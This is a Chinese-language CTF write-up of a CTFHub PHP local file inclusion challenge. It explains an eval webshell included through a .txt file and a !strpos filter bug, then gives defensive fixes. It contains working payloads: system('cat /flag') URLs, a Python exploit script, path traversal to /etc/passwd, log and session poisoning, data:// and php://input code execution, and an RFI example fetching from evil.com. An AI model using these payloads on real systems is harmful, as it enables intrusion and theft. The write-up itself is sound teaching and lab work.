---
layout: post
title: CTFHub - 文件包含 LFI Writeup
platform: ctfhub
date: 2026-10-23 19:08:00 +0800
categories: CTF
---

CTFHub - 文件包含 LFI Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件包含**）
- 题型：Web
- 考点：**本地文件包含（LFI）**、`include` 执行 PHP、`strpos` 逻辑 bug


```text
★ 页面源码（不带参数时 highlight_file 显示）：

    <?php
    error_reporting(0);
    if (isset($_GET['file'])) {
        if (!strpos($_GET["file"], "flag")) {      // ★ 过滤：文件名不能含 flag
            include $_GET["file"];                 // ★ 文件包含点
        } else {
            echo "Hacker!!!";
        }
    } else {
        highlight_file(__FILE__);
    }
    ?>
    <hr>
    i have a <a href="shell.txt">shell</a>, how to use it ?

★ 提示里有 shell.txt：

    访问 /shell.txt 看到内容：
        <?php eval($_REQUEST['ctfhub']);?>

    ★ 参数名是 ctfhub（不是 cmd！）

★ 利用：

    ?file=shell.txt&ctfhub=system('id');
    → uid=33(www-data) gid=33(www-data) groups=33(www-data)      ✅ RCE

    ★ 原理：include 会把文件里的 <?php ... ?> 当代码执行
      文件后缀是 .txt 也没关系（include 不看后缀，只看内容）

★ 找 flag：

    ?file=shell.txt&ctfhub=system('ls -la /');
    → -rw-r--r-- 1 root root 33 flag        ← ★ 根目录

    ?file=shell.txt&ctfhub=system('cat /flag');
    → ctfhub{7fefa39027f618505069e169}

★ 顺便发现的过滤器 bug：

    测试 ?file=flag       → ✅ 放行（不是被拦！）
    测试 ?file=flag.txt   → ✅ 放行
    测试 ?file=/flag      → ❌ 被拦
    测试 ?file=aaflag     → ❌ 被拦

    ★ 因为 if (!strpos($s, "flag")) 里，
      当 "flag" 出现在【位置 0】时 strpos 返回 0，
      !0 == true → 反而【通过】检查！

flag         : ctfhub{7fefa39027f618505069e169}
```

二、题目分析

**① 什么是"文件包含"**

```php
include $_GET['file'];
```

**`include` 的作用**：

```
把指定文件的内容"读进来"，当作 PHP 代码执行

    include 'header.php';      // 把 header.php 的内容插入到这里
    include 'config.php';      // 读取配置
```

**危险在哪**：

```
如果文件名由用户控制 → 用户能让 PHP 包含任意文件
    · 包含系统文件 → 读取源码/配置（信息泄露）
    · 包含日志文件 → 执行你写进日志的 PHP 代码（RCE）
    · 包含上传的图片 → 执行图片里的 PHP 代码（图片马）
    · 配合 php://filter → 读任意文件源码
```

**② 为什么 `.txt` 里的 PHP 代码会执行**

**关键认知**：

```
include 一个文件时，PHP 会：
    ① 打开文件
    ② 扫描内容，找 <?php ... ?> 标签
    ③ 把标签内的代码【执行】
    ④ 标签外的内容【原样输出】

★ 这与"直接访问该文件"完全不同！

对比：
    直接访问 /shell.txt
        → Apache 看到 .txt → 当纯文本返回 → 不执行 PHP  ❌

    通过 include 包含 shell.txt
        → PHP 引擎读文件 → 发现 <?php ?> → 执行  ✅
```

**这就是本题的核心**：

```php
// shell.txt 的内容
<?php eval($_REQUEST['ctfhub']);?>

// ?file=shell.txt 时
include 'shell.txt';
// → PHP 执行 eval($_REQUEST['ctfhub'])
// → 你把 ctfhub=system('cat /flag'); 传进去 → RCE
```

**③ 过滤器的逻辑 bug（`!strpos`）**

```php
if (!strpos($_GET["file"], "flag")) {
    include $_GET["file"];       // 进入这里 = 包含
} else {
    echo "Hacker!!!";            // 进入这里 = 拦截
}
```

**`strpos` 的返回值**：

```
strpos("abcdef", "cd")   → 2      （找到，返回位置）
strpos("abcdef", "xy")   → false  （没找到）
strpos("flag.php", "flag") → 0    （★ 在位置 0 找到）
```

**问题来了**：

```php
!strpos($s, "flag")

情况 1：$s = "shell.txt"（不含 flag）
    strpos → false
    !false → true
    → 包含 ✅（正常）

情况 2：$s = "/flag"（含 flag，位置 1）
    strpos → 1
    !1 → false
    → 拦截 ✅（正常）

情况 3：$s = "flag"（含 flag，位置 0）★
    strpos → 0
    !0 → true
    → 包含！（过滤被绕过了）
```

**★ 这是 PHP 的经典逻辑 bug**：

```
0 在 PHP 里是"假值"（falsy）
所以 !0 == true
程序员想表达"没找到"，但 0 既表示"找到，在开头"也表示"假"
→ 混淆了
```

**正确的写法**：

```php
// ❌ 错（本题的写法）
if (!strpos($s, "flag")) { ... }

// ✅ 对
if (strpos($s, "flag") === false) { ... }
```

**实测验证**：

```
?file=flag       → ✅ 放行（strpos = 0）
?file=flag.txt   → ✅ 放行（strpos = 0）
?file=/flag      → ❌ 被拦（strpos = 1）
?file=aaflag     → ❌ 被拦（strpos = 2）
```

**★ 本题里这个 bug 没直接利用上**（因为 flag 在 `/flag`，路径以 `/` 开头），
**但它是一个必须知道的经典漏洞模式。**

**④ `php://filter` 包装器**

```php
?file=php://filter/convert.base64-encode/resource=shell.txt
→ PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0Zmh1YiddKTs/Pg==
  （Base64 解码 = <?php eval($_REQUEST['ctfhub']);?>）
```

**作用**：

```
把文件内容"以 Base64 编码后返回"，而不是"当 PHP 执行"

★ 用途：读取 PHP 文件的【源码】
  （如果直接 include 一个 .php，它会执行，你看不到源码）
```

**本题实测可用**，是读源码的利器。

三、解题步骤

**第 1 步：看源码，找出包含点**

```
直接访问首页 → highlight_file 显示源码

    include $_GET["file"];
    
★ 包含点在 ?file= 参数
★ 有过滤：文件名不能含 "flag"
★ 提示里有 shell.txt
```

**第 2 步：看 shell.txt 的内容**

```
访问 /shell.txt
→ <?php eval($_REQUEST['ctfhub']);?>

★ 参数名是 ctfhub
★ 这是个 eval 木马
```

**第 3 步：包含 shell.txt 并传参**

```
?file=shell.txt&ctfhub=system('id');

→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**★ 注意**：

```
① 必须同时传两个参数：file（要包含的文件）+ ctfhub（木马的参数）
② ctfhub 的值是 PHP 代码，末尾要有分号
```

**第 4 步：找 flag**

```
?file=shell.txt&ctfhub=system('ls -la /');
→ 看到 -rw-r--r-- 1 root root 33 flag

?file=shell.txt&ctfhub=system('cat /flag');
→ ctfhub{7fefa39027f618505069e169}
```

**第 5 步：提交 → 通关**

---

**手工操作（浏览器）**

```
① 访问首页看源码
② 访问 /shell.txt 看木马（知道参数名是 ctfhub）
③ 地址栏输入：

   http://challenge-xxx:10800/?file=shell.txt&ctfhub=system('id');

   ★ 注意：& 符号要写，浏览器的地址栏里可以直接输
   ★ 引号和分号浏览器会自动编码

④ 看到 uid=33(www-data) → 成功

⑤ 换成：
   ?file=shell.txt&ctfhub=system('ls -la /');

⑥ 再换成：
   ?file=shell.txt&ctfhub=system('cat /flag');
```

**★ 这是本系列里最容易手工做的一题** —— 全部在地址栏完成。

---

**自动化脚本**

```python
import ssl, urllib.parse, urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"


def run(cmd):
    payload = "system('%s');" % cmd
    u = BASE + "/?file=shell.txt&ctfhub=" + urllib.parse.quote(payload)
    with urllib.request.urlopen(u, context=CTX, timeout=20) as r:
        return r.read().decode('utf-8', 'replace').split("<hr>")[0].strip()


print(run("ls -la /"))
print(run("cat /flag"))
```

---

**如果 shell.txt 不存在怎么办（通用 LFI 思路）**

**（1）用 php://filter 读源码**

```
?file=php://filter/convert.base64-encode/resource=index.php
```

**（2）路径穿越读系统文件**

```
?file=../../../../etc/passwd
?file=../../../../etc/hosts
?file=../../../../proc/self/environ
```

**（3）包含日志文件（日志包含）**

```
① 先让 Apache/Nginx 把 PHP 代码写进日志：
   访问 http://target/<?php system('id'); ?>
   （用 Burp 发，或者 curl 构造 URL）

② 日志位置（常见）：
   /var/log/apache2/access.log
   /var/log/nginx/access.log
   /var/log/httpd/access_log

③ 包含日志：
   ?file=../../../../var/log/apache2/access.log&cmd=id
```

**（4）包含 session 文件**

```
① 先让 PHP 把代码写进 session（通过某个会写 session 的功能）
② session 位置：/var/lib/php/sessions/sess_<PHPSESSID> 或 /tmp/sess_xxx

③ 包含：
   ?file=../../../../tmp/sess_abc123
```

**（5）包含 /proc/self/environ（需要能控制环境变量）**

```
?file=../../../../proc/self/environ
（User-Agent 会出现在这里，可以往 UA 里写 PHP 代码）
```

**（6）`data://` 包装器（需要 allow_url_include=On）**

```
?file=data://text/plain,<?php system('id');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

**（7）`php://input`（需要 allow_url_include=On）**

```
POST /?file=php://input
body: <?php system('id'); ?>
```

**（8）`phar://` 反序列化（PHP 8 之前）**

```
?file=phar://upload/shell.jpg/shell.php
（需要先传一个 phar 格式的图片马）
```

四、延伸知识

**① LFI / RFI 的区别**

| | LFI（本地文件包含）| RFI（远程文件包含）|
|---|---|---|
| 包含的文件 | 服务器上的文件 | 远程 URL |
| 例子 | `?file=../../etc/passwd` | `?file=http://evil.com/shell.txt` |
| 条件 | 无特殊要求 | `allow_url_include = On` |
| 危害 | 读文件 / 配合日志 RCE | 直接 RCE |
| 本题 | ✅ LFI | |

**② 常见 PHP 包装器（wrapper）**

| 包装器 | 用途 | 例子 |
|---|---|---|
| `php://filter` | 读源码、数据流过滤 | `php://filter/convert.base64-encode/resource=index.php` |
| `php://input` | 读 POST body | `php://input`（配 POST）|
| `php://temp` | 临时流 | |
| `data://` | 内联数据 | `data://text/plain,<?php ...?>` |
| `phar://` | PHAR 归档（可反序列化）| `phar://x.jpg/a.php` |
| `zip://` | ZIP 归档 | `zip://x.zip%23a.php` |
| `expect://` | 执行命令 | `expect://id`（需扩展）|
| `file://` | 文件 | `file:///etc/passwd` |

**★ `php://filter` 是最常用的**，因为它**不需要任何特殊配置**。

**③ `php://filter` 的常见用法**

```php
// 读源码（Base64）
php://filter/convert.base64-encode/resource=index.php

// 读源码（大小写转换，避免关键字过滤）
php://filter/convert.base64-encode/resource=flaM.php

// RCE（写入 filter 链，把内容变成 PHP 代码）
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|.../resource=shell.php
★ 这是"php filter chain"技术，能把任意文件变成 RCE
```

**④ `strpos` 类逻辑 bug 的其他变体**

```php
// ❌ 危险写法 1：!strpos
if (!strpos($s, 'flag')) { ... }
// 绕过：让关键词出现在位置 0

// ❌ 危险写法 2：== false 写成 == 0
if (strpos($s, 'flag') == 0) { ... }

// ❌ 危险写法 3：empty 判断
if (empty(strpos($s, 'flag'))) { ... }
// 同样把 0 当成"空"

// ✅ 正确写法
if (strpos($s, 'flag') === false) { ... }
// ★ 必须用 === （严格比较类型）

// ✅ 或者用 str_contains（PHP 8+）
if (!str_contains($s, 'flag')) { ... }
```

**★ 这是 PHP 安全里最经典的坑之一**：
**`0 == false` 为 true，所以"找到在开头"会被误判成"没找到"。**

**⑤ 文件包含的防护**

```text
① ★ 白名单（最有效）
    $allow = ['home.php', 'about.php', 'contact.php'];
    if (!in_array($_GET['file'], $allow)) die();

② ★ 不要用用户输入拼路径
    include __DIR__ . '/' . $page;

③ ★ 禁用危险包装器
    allow_url_include = Off       （默认就是 Off）
    allow_url_fopen = Off

④ ★ open_basedir 限制文件访问范围
    open_basedir = /var/www/html

⑤ 过滤 `..`、`/`、`php://`、`file://` 等
    （但黑名单容易被绕，不如白名单）

⑥ 上传目录禁止执行
```

五、总结

- **本题核心：`include($_GET['file'])` + 白送的 `shell.txt`（含 eval 木马）→ RCE。**
- 一个 URL：

```
?file=shell.txt&ctfhub=system('cat /flag');
```

- **三个必记要点**：

```text
① include 会把文件里的 <?php ?> 当代码执行 —— 后缀是 .txt 也不影响
   （这和"直接访问文件"完全不同）
② 过滤器的 !strpos() 是经典 bug：关键词在位置 0 时会被放行
③ php://filter 能在"不执行"的情况下读 PHP 源码（Base64 编码）
```

- **实测 flag**：

```text
ctfhub{7fefa39027f618505069e169}
（在根目录 /flag）
```

**手工复现要点**：

```text
· 第一步：不带参数访问 → 看源码（highlight_file 白给）
· 第二步：看提示里的 shell.txt → 确认参数名（本题是 ctfhub）
· 第三步：?file=shell.txt&ctfhub=system('命令');
· 找 flag：ls -la / （根目录最常见）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  include = "读文件 + 执行里面的 PHP 代码"                 │
│                                                        │
│  直接访问 .txt  → 当文本返回（不执行）                   │
│  include .txt  → 执行里面的 PHP（★）                    │
│                                                        │
│  所以"上传图片马 + 文件包含"是经典组合                   │
│                                                        │
│  ★ 另一个必修点：!strpos() 的 0 陷阱                    │
│    关键词在开头 = 找到但也 = 假值 = 被放行               │
└────────────────────────────────────────────────────────┘
```
